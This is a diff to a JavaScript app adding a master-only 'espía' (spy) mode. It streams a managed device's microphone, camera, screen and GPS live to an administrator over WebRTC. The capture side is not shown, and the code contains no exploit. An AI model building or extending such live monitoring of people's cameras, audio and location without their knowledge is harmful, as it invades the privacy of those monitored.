@@ -27473,6 +27473,437 @@ const MOS = (() => {
     _selectorDispMostrar(nombre, devs, 'espia');
   }
 
+  // ════════════════════════════════════════════════════════════════════
+  // [v2.43.57] MODO ESPÍA V2 — WebRTC 4 streams (audio + cámara + screen + GPS)
+  // ────────────────────────────────────────────────────────────────────
+  // Layout: pantalla grande 70% + sidebar con audio/cámara/GPS.
+  // Click cámara mini → swap con bounce. ⌖ → fullscreen.
+  // Sincronización: badge color verde<2s, ámbar<5s, rojo>5s.
+  // Efectos premium: glow halo, breathing LIVE, waveform real,
+  // sonidos WebAudio sintetizados (pop/chime/shimmer/whoosh).
+  // ════════════════════════════════════════════════════════════════════
+  let _espiaV2 = null;  // { pc, sesionId, deviceId, masterId, streams:{}, pollTimer, focus:'pantalla', tsInicio }
+
+  // Sonidos WebAudio sintetizados (sin samples)
+  let _espiaAudioCtx = null;
+  function _espiaSfx(tipo) {
+    try {
+      if (!_espiaAudioCtx) _espiaAudioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      const ctx = _espiaAudioCtx; const t = ctx.currentTime;
+      function tone(freq, dur, gainVal, opts) {
+        const o = ctx.createOscillator(); const g = ctx.createGain();
+        o.type = (opts && opts.type) || 'sine';
+        o.frequency.value = freq;
+        g.gain.value = gainVal;
+        o.connect(g); g.connect(ctx.destination);
+        o.start(t + (opts && opts.delay || 0));
+        g.gain.exponentialRampToValueAtTime(0.001, t + (opts && opts.delay || 0) + dur);
+        o.stop(t + (opts && opts.delay || 0) + dur + .05);
+      }
+      if (tipo === 'pop')      { tone(440, .08, .12, {type:'triangle'}); }
+      else if (tipo === 'chime') {
+        tone(880, .15, .12, {type:'sine'});
+        tone(1320, .18, .10, {type:'sine', delay:.06});
+      }
+      else if (tipo === 'shimmer') {
+        tone(660, .12, .10, {type:'triangle'});
+        tone(990, .15, .08, {type:'triangle', delay:.05});
+        tone(1320, .18, .06, {type:'triangle', delay:.10});
+      }
+      else if (tipo === 'whoosh') {
+        const o = ctx.createOscillator(); const g = ctx.createGain();
+        o.type='sawtooth'; o.frequency.setValueAtTime(200,t); o.frequency.exponentialRampToValueAtTime(1200,t+.25);
+        g.gain.setValueAtTime(.001,t); g.gain.exponentialRampToValueAtTime(.08,t+.05); g.gain.exponentialRampToValueAtTime(.001,t+.3);
+        o.connect(g); g.connect(ctx.destination); o.start(t); o.stop(t+.32);
+      }
+      else if (tipo === 'fail') {
+        tone(440, .12, .15, {type:'sawtooth'});
+        tone(220, .15, .12, {type:'sawtooth', delay:.08});
+      }
+    } catch(_){}
+  }
+
+  // Punto de entrada — pide clave + crea sesión + abre modal optimista
+  async function abrirEspiaV2(idDispositivo) {
+    if (!_esMasterSession()) { toast('Solo Master puede usar espía v2', 'error'); return; }
+    const d = (cfgData.dispositivos || []).find(x => x.ID_Dispositivo === idDispositivo);
+    if (!d) { toast('Dispositivo no encontrado', 'error'); return; }
+    if (_espiaV2 && _espiaV2.deviceId === idDispositivo) {
+      toast('Ya estás conectado a este dispositivo', 'info');
+      return;
+    }
+    if (_espiaV2) {
+      const ok = await _modalConfirm(`Ya hay sesión activa con ${_espiaV2.nombre}. ¿Cerrarla y abrir nueva?`, { warning: true });
+      if (!ok) return;
+      _espiaV2Cerrar('cambio');
+    }
+    _espiaSfx('pop');
+    const nombre = d.Ultima_Sesion || d.Nombre_Equipo || idDispositivo;
+    // Modal optimista — abrir inmediato con estado "conectando"
+    _espiaV2 = {
+      sesionId: null,
+      deviceId: idDispositivo,
+      nombre: nombre,
+      pc: null,
+      streams: { audio: null, camara: null, pantalla: null },
+      gpsUlt: null,
+      pollTimer: null,
+      pollIceDesde: 0,
+      focus: 'pantalla',
+      tsInicio: Date.now(),
+      lagMs: 0,
+      estado: 'conectando'
+    };
+    _espiaV2RenderModal();
+    // Crear sesión backend
+    try {
+      const r = await API.post('espiaCrearSesion', {
+        masterId: S.session?.idPersonal || S.session?.nombre || 'master',
+        deviceId: idDispositivo
+      });
+      if (!r || r.ok === false) {
+        toast('Error creando sesión: ' + (r?.error || ''), 'error');
+        _espiaV2Cerrar('error_init');
+        return;
+      }
+      _espiaV2.sesionId = r.data.sesionId;
+      _espiaV2.ttl = r.data.ttl;
+      _espiaV2IniciarPeerConnection();
+    } catch(e) {
+      toast('Error: ' + e.message, 'error');
+      _espiaV2Cerrar('error_init');
+    }
+  }
+
+  async function _espiaV2IniciarPeerConnection() {
+    if (!_espiaV2) return;
+    // STUN público de Google
+    const pc = new RTCPeerConnection({
+      iceServers: [{ urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302'] }]
+    });
+    _espiaV2.pc = pc;
+    // Track recibido: asignar al video/audio element del modal
+    pc.ontrack = (ev) => {
+      const stream = ev.streams[0];
+      const track  = ev.track;
+      const label  = (track.label || '').toLowerCase();
+      let tipo = 'audio';
+      if (track.kind === 'video') {
+        tipo = label.indexOf('screen') >= 0 || label.indexOf('display') >= 0 ? 'pantalla' : 'camara';
+      }
+      _espiaV2.streams[tipo] = stream;
+      _espiaSfx('chime');
+      _espiaV2RenderModal();
+      _espiaV2ActualizarStream(tipo, stream);
+      // Reportar streams activos al backend (para audit)
+      API.post('espiaReportarStreams', {
+        sesionId: _espiaV2.sesionId,
+        streams: {
+          audio:    !!_espiaV2.streams.audio,
+          camara:   !!_espiaV2.streams.camara,
+          pantalla: !!_espiaV2.streams.pantalla
+        }
+      }).catch(()=>{});
+    };
+    // DataChannel para GPS (device → master)
+    pc.ondatachannel = (ev) => {
+      const dc = ev.channel;
+      if (dc.label === 'gps') {
+        dc.onmessage = (msg) => {
+          try {
+            const data = JSON.parse(msg.data);
+            _espiaV2.gpsUlt = data;
+            _espiaV2RenderGpsMini();
+          } catch(_){}
+        };
+      }
+    };
+    // ICE local → mandar al backend
+    pc.onicecandidate = (ev) => {
+      if (ev.candidate) {
+        API.post('espiaAgregarIce', {
+          sesionId: _espiaV2.sesionId,
+          lado: 'master',
+          ice: ev.candidate.toJSON ? ev.candidate.toJSON() : ev.candidate
+        }).catch(()=>{});
+      }
+    };
+    pc.onconnectionstatechange = () => {
+      const st = pc.connectionState;
+      if (_espiaV2) _espiaV2.estado = st;
+      if (st === 'connected') {
+        _espiaSfx('chime');
+        _espiaV2.estado = 'live';
+        _espiaV2RenderModal();
+      } else if (st === 'failed' || st === 'disconnected') {
+        _espiaSfx('fail');
+        _espiaV2.estado = st;
+        _espiaV2RenderModal();
+      }
+    };
+    // Crear oferta y enviarla
+    const offer = await pc.createOffer({ offerToReceiveAudio: true, offerToReceiveVideo: true });
+    await pc.setLocalDescription(offer);
+    await API.post('espiaSubirOferta', { sesionId: _espiaV2.sesionId, sdp: JSON.stringify(offer) });
+    // Polling de respuesta + ICE del device
+    _espiaV2.pollTimer = setInterval(_espiaV2Poll, 600);
+  }
+
+  async function _espiaV2Poll() {
+    if (!_espiaV2 || !_espiaV2.sesionId) return;
+    try {
+      const t0 = Date.now();
+      // 1) Si aún no tenemos remoteDescription, leer respuesta
+      if (!_espiaV2.pc.remoteDescription) {
+        const r = await API.post('espiaLeerRespuesta', { sesionId: _espiaV2.sesionId });
+        if (r?.data?.sdpRespuesta) {
+          try {
+            const sdp = JSON.parse(r.data.sdpRespuesta);
+            await _espiaV2.pc.setRemoteDescription(sdp);
+          } catch(e) { console.warn('[espia] respuesta inválida', e); }
+        }
+      }
+      // 2) Leer ICE candidates del device
+      const ri = await API.post('espiaLeerIce', {
+        sesionId: _espiaV2.sesionId,
+        lado: 'device',
+        desde: _espiaV2.pollIceDesde
+      });
+      if (ri?.data?.ice?.length) {
+        for (const c of ri.data.ice) {
+          try { await _espiaV2.pc.addIceCandidate(c.ice); } catch(_){}
+        }
+        _espiaV2.pollIceDesde = ri.data.tsMax || _espiaV2.pollIceDesde;
+      }
+      // Tracking de lag
+      _espiaV2.lagMs = Date.now() - t0;
+      _espiaV2RenderSyncBadge();
+    } catch(e) {
+      console.warn('[espia poll]', e);
+    }
+  }
+
+  function _espiaV2Cerrar(motivo) {
+    if (!_espiaV2) return;
+    try { _espiaSfx('whoosh'); } catch(_){}
+    if (_espiaV2.pollTimer) clearInterval(_espiaV2.pollTimer);
+    try { _espiaV2.pc?.close(); } catch(_){}
+    Object.values(_espiaV2.streams).forEach(s => {
+      try { s?.getTracks().forEach(t => t.stop()); } catch(_){}
+    });
+    if (_espiaV2.sesionId) {
+      API.post('espiaCerrarSesion', { sesionId: _espiaV2.sesionId, motivo: motivo || 'manual', lado: 'master' }).catch(()=>{});
+    }
+    const modal = document.getElementById('espiaV2Modal');
+    if (modal) {
+      modal.style.animation = 'espiaV2Out .3s ease-out forwards';
+      setTimeout(() => modal.remove(), 300);
+    }
+    _espiaV2 = null;
+  }
+
+  function _espiaV2RenderModal() {
+    if (!_espiaV2) return;
+    const focusEsCamara = _espiaV2.focus === 'camara';
+    const html = `<div id="espiaV2Modal" style="position:fixed;inset:0;background:rgba(0,0,0,.78);backdrop-filter:blur(10px);z-index:2147483646;display:flex;align-items:center;justify-content:center;padding:24px;animation:espiaV2In .35s cubic-bezier(.34,1.56,.64,1)">
+      <div style="width:100%;max-width:1280px;height:88vh;background:linear-gradient(180deg,#0a1424,#070d18);border:1px solid rgba(99,102,241,.4);border-radius:18px;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 30px 70px -10px rgba(99,102,241,.4),0 0 0 1px rgba(99,102,241,.15) inset"
+        onclick="event.stopPropagation()">
+        <!-- HEADER -->
+        <div style="padding:14px 20px;border-bottom:1px solid #1e293b;background:linear-gradient(135deg,rgba(99,102,241,.15),rgba(99,102,241,.03));display:flex;align-items:center;gap:14px;flex-shrink:0">
+          <div id="espiaV2Live" class="espia-live-dot" style="display:flex;align-items:center;gap:8px">
+            <span style="width:10px;height:10px;border-radius:50%;background:${_espiaV2.estado === 'live' ? '#10b981' : '#f59e0b'};animation:espiaBreath 2s ease-in-out infinite;box-shadow:0 0 10px ${_espiaV2.estado === 'live' ? '#10b981' : '#f59e0b'}"></span>
+            <span style="font-size:11px;font-weight:900;color:${_espiaV2.estado === 'live' ? '#10b981' : '#f59e0b'};letter-spacing:.5px">${_espiaV2.estado === 'live' ? 'EN VIVO' : 'CONECTANDO'}</span>
+          </div>
+          <div style="flex:1;min-width:0">
+            <div style="font-size:13px;font-weight:700;color:#e2e8f0;display:flex;align-items:center;gap:6px">
+              👤 ${_escapeHtml(_espiaV2.nombre)}
+            </div>
+            <div style="font-size:10px;color:#94a3b8;margin-top:1px">${_escapeHtml(_espiaV2.deviceId)}</div>
+          </div>
+          <div id="espiaV2SyncBadge" style="font-size:10px;font-weight:700;padding:4px 10px;border-radius:20px;background:rgba(16,185,129,.15);color:#10b981;border:1px solid rgba(16,185,129,.4)">
+            sync OK · ${_espiaV2.lagMs}ms
+          </div>
+          <button onclick="MOS.cerrarEspiaV2()" style="background:rgba(248,113,113,.15);border:1px solid rgba(248,113,113,.4);color:#fca5a5;border-radius:8px;padding:6px 12px;font-size:14px;font-weight:900;cursor:pointer">✕</button>
+        </div>
+        <!-- BODY -->
+        <div style="flex:1;display:flex;gap:14px;padding:14px;overflow:hidden">
+          <!-- Stream grande -->
+          <div id="espiaV2Big" style="flex:1;background:#020617;border-radius:12px;overflow:hidden;position:relative;border:2px solid ${focusEsCamara ? 'rgba(99,102,241,.5)' : 'rgba(16,185,129,.5)'};box-shadow:0 0 30px -10px ${focusEsCamara ? '#6366f155' : '#10b98155'};transition:border-color .3s,box-shadow .3s">
+            <div id="espiaV2BigLabel" style="position:absolute;top:10px;left:12px;font-size:10px;font-weight:800;color:#fff;background:rgba(0,0,0,.65);padding:4px 10px;border-radius:6px;z-index:5;backdrop-filter:blur(4px)">
+              ${focusEsCamara ? '📷 CÁMARA' : '🖥️ PANTALLA DEL DISPOSITIVO'}
+            </div>
+            <button onclick="MOS._espiaV2Fullscreen()" style="position:absolute;top:10px;right:10px;background:rgba(0,0,0,.5);border:1px solid rgba(255,255,255,.2);color:#fff;border-radius:6px;padding:5px 9px;font-size:13px;cursor:pointer;z-index:5;backdrop-filter:blur(4px);transition:background .15s"
+                    onmouseover="this.style.background='rgba(99,102,241,.5)'"
+                    onmouseout="this.style.background='rgba(0,0,0,.5)'"
+                    title="Fullscreen">⌖</button>
+            <video id="espiaV2BigVideo" autoplay playsinline muted=false
+                   style="width:100%;height:100%;object-fit:contain;background:#000"></video>
+            ${!_espiaV2.streams[_espiaV2.focus] ? `
+              <div style="position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;background:linear-gradient(135deg,#0f172a,#0a1424);color:#64748b">
+                <div style="width:50px;height:50px;border:3px solid rgba(99,102,241,.3);border-top-color:#6366f1;border-radius:50%;animation:espiaSpin 1s linear infinite"></div>
+                <div style="margin-top:14px;font-size:11px;color:#94a3b8;font-weight:600">Conectando ${_espiaV2.focus}…</div>
+              </div>` : ''}
+          </div>
+          <!-- Sidebar -->
+          <div style="width:260px;display:flex;flex-direction:column;gap:10px;flex-shrink:0">
+            <!-- Audio card -->
+            <div id="espiaV2AudioCard" style="background:#0f172a;border:1px solid rgba(34,211,238,.3);border-radius:10px;padding:11px;box-shadow:0 0 18px -8px #22d3ee44">
+              <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
+                <div style="font-size:9px;font-weight:800;color:#22d3ee;text-transform:uppercase;letter-spacing:.5px">🎤 AUDIO</div>
+                <button onclick="MOS._espiaV2ToggleMute()" id="espiaV2MuteBtn" style="background:none;border:0;color:#94a3b8;cursor:pointer;font-size:13px" title="Silenciar">🔊</button>
+              </div>
+              <canvas id="espiaV2Wave" width="232" height="40" style="width:100%;height:40px;background:#000;border-radius:6px"></canvas>
+              <div id="espiaV2AudioInfo" style="font-size:9px;color:#94a3b8;margin-top:5px;font-family:monospace">esperando…</div>
+              <audio id="espiaV2AudioEl" autoplay></audio>
+            </div>
+            <!-- Cámara mini (click → swap) -->
+            <div id="espiaV2CamCard" onclick="MOS._espiaV2Swap()" style="background:#0f172a;border:1px solid ${focusEsCamara ? 'rgba(16,185,129,.4)' : 'rgba(99,102,241,.3)'};border-radius:10px;padding:11px;cursor:${focusEsCamara ? 'default' : 'pointer'};transition:all .25s;box-shadow:0 0 18px -8px ${focusEsCamara ? '#10b98144' : '#6366f144'}"
+                 ${focusEsCamara ? '' : `onmouseover="this.style.transform='translateY(-2px)';this.style.boxShadow='0 4px 24px -6px #6366f188'"
+                 onmouseout="this.style.transform='translateY(0)';this.style.boxShadow='0 0 18px -8px #6366f144'"`}>
+              <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
+                <div style="font-size:9px;font-weight:800;color:#a5b4fc;text-transform:uppercase;letter-spacing:.5px">📷 ${focusEsCamara ? 'CÁMARA (focus)' : 'CÁMARA'}</div>
+                ${!focusEsCamara ? '<span style="font-size:8px;color:#64748b">click=swap</span>' : ''}
+              </div>
+              <video id="espiaV2CamMini" autoplay playsinline muted
+                     style="width:100%;height:90px;object-fit:cover;background:#000;border-radius:6px"></video>
+              ${!_espiaV2.streams.camara ? `
+                <div style="position:relative;margin-top:-90px;height:90px;display:flex;align-items:center;justify-content:center;background:#020617;border-radius:6px">
+                  <div style="width:24px;height:24px;border:2px solid rgba(99,102,241,.3);border-top-color:#6366f1;border-radius:50%;animation:espiaSpin 1s linear infinite"></div>
+                </div>` : ''}
+            </div>
+            <!-- GPS mini -->
+            <div style="background:#0f172a;border:1px solid rgba(236,72,153,.3);border-radius:10px;padding:11px;box-shadow:0 0 18px -8px #ec489944">
+              <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">
+                <div style="font-size:9px;font-weight:800;color:#ec4899;text-transform:uppercase;letter-spacing:.5px">📍 GPS</div>
+                <span id="espiaV2GpsDot" style="width:6px;height:6px;border-radius:50%;background:#475569"></span>
+              </div>
+              <div id="espiaV2GpsInfo" style="font-size:9px;color:#94a3b8;font-family:monospace;line-height:1.5">esperando…</div>
+              <div id="espiaV2GpsMap" style="margin-top:6px;height:80px;background:#020617;border-radius:6px;display:flex;align-items:center;justify-content:center;color:#475569;font-size:20px">🗺️</div>
+            </div>
+            <!-- Stats -->
+            <div style="background:rgba(15,23,42,.5);border:1px solid #1e293b;border-radius:8px;padding:8px 10px;font-size:9px;color:#64748b;font-family:monospace;margin-top:auto">
+              <div>sesión: ${(_espiaV2.sesionId || '—').slice(0,20)}</div>
+              <div>estado: <span style="color:#a5b4fc">${_espiaV2.estado}</span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <style>
+        @keyframes espiaV2In { from { opacity:0; transform:scale(.96) } to { opacity:1; transform:scale(1) } }
+        @keyframes espiaV2Out { to { opacity:0; transform:scale(.96) } }
+        @keyframes espiaBreath { 0%,100% { transform:scale(1);opacity:.85 } 50% { transform:scale(1.3);opacity:1 } }
+        @keyframes espiaSpin { to { transform:rotate(360deg) } }
+        #espiaV2Modal .espia-live-dot { transition:all .3s }
+      </style>
+    </div>`;
+    const old = document.getElementById('espiaV2Modal');
+    if (old) old.remove();
+    document.body.insertAdjacentHTML('beforeend', html);
+    // Re-vincular streams a sus video elements
+    setTimeout(() => {
+      _espiaV2ActualizarStream(_espiaV2.focus, _espiaV2.streams[_espiaV2.focus]);
+      _espiaV2ActualizarStream('camara_mini', _espiaV2.streams.camara, 'espiaV2CamMini');
+      _espiaV2VincularAudio();
+      _espiaV2DibujarWaveform();
+      _espiaV2RenderGpsMini();
+    }, 30);
+  }
+
+  function _espiaV2ActualizarStream(tipoFocus, stream, elementId) {
+    if (!stream) return;
+    const el = document.getElementById(elementId || 'espiaV2BigVideo');
+    if (el && el.srcObject !== stream) el.srcObject = stream;
+  }
+  function _espiaV2VincularAudio() {
+    if (!_espiaV2?.streams.audio) return;
+    const a = document.getElementById('espiaV2AudioEl');
+    if (a) a.srcObject = _espiaV2.streams.audio;
+  }
+  function _espiaV2DibujarWaveform() {
+    if (!_espiaV2?.streams.audio) return;
+    try {
+      if (!_espiaAudioCtx) _espiaAudioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      const ctx = _espiaAudioCtx;
+      const src = ctx.createMediaStreamSource(_espiaV2.streams.audio);
+      const analyser = ctx.createAnalyser();
+      analyser.fftSize = 256;
+      src.connect(analyser);
+      const canvas = document.getElementById('espiaV2Wave');
+      if (!canvas) return;
+      const cctx = canvas.getContext('2d');
+      const buf = new Uint8Array(analyser.frequencyBinCount);
+      function draw() {
+        if (!_espiaV2 || !document.getElementById('espiaV2Wave')) return;
+        analyser.getByteFrequencyData(buf);
+        cctx.fillStyle = '#000';
+        cctx.fillRect(0, 0, canvas.width, canvas.height);
+        const barW = canvas.width / buf.length;
+        for (let i = 0; i < buf.length; i++) {
+          const h = (buf[i] / 255) * canvas.height;
+          const grad = cctx.createLinearGradient(0, canvas.height, 0, 0);
+          grad.addColorStop(0, '#06b6d4');
+          grad.addColorStop(1, '#22d3ee');
+          cctx.fillStyle = grad;
+          cctx.fillRect(i * barW, canvas.height - h, barW - 1, h);
+        }
+        // dB approx
+        const promedio = buf.reduce((s, v) => s + v, 0) / buf.length;
+        const info = document.getElementById('espiaV2AudioInfo');
+        if (info) info.textContent = `${Math.round(promedio)} dB · live`;
+        requestAnimationFrame(draw);
+      }
+      draw();
+    } catch(_){}
+  }
+  function _espiaV2RenderGpsMini() {
+    const info = document.getElementById('espiaV2GpsInfo');
+    const dot = document.getElementById('espiaV2GpsDot');
+    if (!info) return;
+    const g = _espiaV2?.gpsUlt;
+    if (!g) { info.textContent = 'esperando…'; if (dot) dot.style.background = '#475569'; return; }
+    info.innerHTML = `lat ${g.lat?.toFixed(5)}<br>lng ${g.lng?.toFixed(5)}<br>vel ${(g.speed*3.6 || 0).toFixed(1)} km/h<br>acc ${g.acc?.toFixed(0)}m`;
+    if (dot) {
+      dot.style.background = '#10b981';
+      dot.style.animation = 'espiaBreath 1s';
+      setTimeout(() => { if (dot) dot.style.animation = ''; }, 1000);
+    }
+  }
+  function _espiaV2RenderSyncBadge() {
+    const b = document.getElementById('espiaV2SyncBadge');
+    if (!b || !_espiaV2) return;
+    const lag = _espiaV2.lagMs;
+    let color = '#10b981', bg = 'rgba(16,185,129,.15)', border = 'rgba(16,185,129,.4)', txt = 'sync OK';
+    if (lag > 2000) { color = '#f59e0b'; bg = 'rgba(245,158,11,.15)'; border = 'rgba(245,158,11,.4)'; txt = 'sync lento'; }
+    if (lag > 5000) { color = '#ef4444'; bg = 'rgba(239,68,68,.15)'; border = 'rgba(239,68,68,.4)'; txt = 'sync mal'; }
+    b.style.color = color; b.style.background = bg; b.style.borderColor = border;
+    b.textContent = `${txt} · ${lag}ms`;
+  }
+  function _espiaV2Swap() {
+    if (!_espiaV2) return;
+    _espiaSfx('shimmer');
+    _espiaV2.focus = _espiaV2.focus === 'pantalla' ? 'camara' : 'pantalla';
+    _espiaV2RenderModal();
+  }
+  function _espiaV2ToggleMute() {
+    const a = document.getElementById('espiaV2AudioEl');
+    const btn = document.getElementById('espiaV2MuteBtn');
+    if (!a) return;
+    a.muted = !a.muted;
+    if (btn) btn.textContent = a.muted ? '🔇' : '🔊';
+    _espiaSfx('pop');
+  }
+  function _espiaV2Fullscreen() {
+    _espiaSfx('whoosh');
+    const wrap = document.getElementById('espiaV2Big');
+    if (!wrap) return;
+    if (!document.fullscreenElement) {
+      wrap.requestFullscreen?.().catch(() => {});
+    } else {
+      document.exitFullscreen?.();
+    }
+  }
+  function cerrarEspiaV2() { _espiaV2Cerrar('manual'); }
+
   // Inicia espía (audio + gps) y abre el modal grande SIN bloquear.
   async function abrirEspiaDispositivo(idDispositivo) {
     const d = (cfgData.dispositivos || []).find(x => x.ID_Dispositivo === idDispositivo);
@@ -36773,6 +37204,9 @@ var _pPickState = { filtroZona: null, filtroTipo: null, mostrarTodas: false };
     abrirMenuPurgaGrupo, _cerrarKebab,
     // [v2.43.53] Kebab Master en header (Purgar + Log)
     abrirKebabMaster, _cerrarKebabMaster,
+    // [v2.43.57] Espía V2 — WebRTC 4 streams con efectos premium
+    abrirEspiaV2, cerrarEspiaV2,
+    _espiaV2Swap, _espiaV2ToggleMute, _espiaV2Fullscreen,
     abrirCestaPurga, cerrarCestaPurga,
     _purgaToggleExpand, _purgaToggle, _purgaSetFiltro, _purgaSetSoloSinVentas,
     _purgaConfirmar, _cerrarConfirmPurga, _purgaValidarClave, _purgaEjecutar,
